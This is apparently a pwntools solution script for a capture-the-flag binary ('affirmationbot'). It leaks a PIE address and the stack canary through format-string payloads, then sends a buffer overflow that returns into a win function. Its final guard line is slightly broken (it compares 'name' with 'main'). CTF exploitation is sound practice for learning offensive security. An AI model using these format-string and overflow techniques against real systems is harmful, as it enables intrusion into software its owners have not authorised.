#!/usr/bin/env python3

from pwn import *

elf = ELF("./affirmationbot")

gs = '''
continue
'''

#context.binary = elf

def conn():
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    elif args.LOCAL:
        return process([elf.path])
    else:
        return remote("chal.wwctf.com", 4001)

io = conn()

def main():

    # good luck pwning 

    # gdb.attach(io, gdbscript=gs)

    payload = f"%27$llx".encode()
    canaryp = f"%25$llx".encode()
    io.sendlineafter(b">", payload)
    leak = io.recvline().strip()
    last = leak.split()[len(leak.split())-1]
    sleak = last.decode()
    pieleak = int(sleak, 16)
    piebase = pieleak - 0x1504
    print(hex(piebase))
    io.sendlineafter(b">", canaryp)
    cleak = io.recvline().strip()
    clast = cleak.split()[len(cleak.split())-1]
    scleak = clast.decode()
    canary = int(scleak, 16)
    print(hex(canary))
    winaddr = piebase + 0x11e9
    print(hex(winaddr))
    mainaddr = piebase + 0x47c
    print(hex(mainaddr))
    ret = piebase + 0x101a
    bufovr = flat(b"A"*136, p64(canary), p64(ret), p64(ret), p64(winaddr), p64(mainaddr))
    io.sendlineafter(b">", bufovr)
    print(io.recvline())
    print(io.recvline())
    print(io.recvline())
    #io.interactive()

if name == "main":
    main()
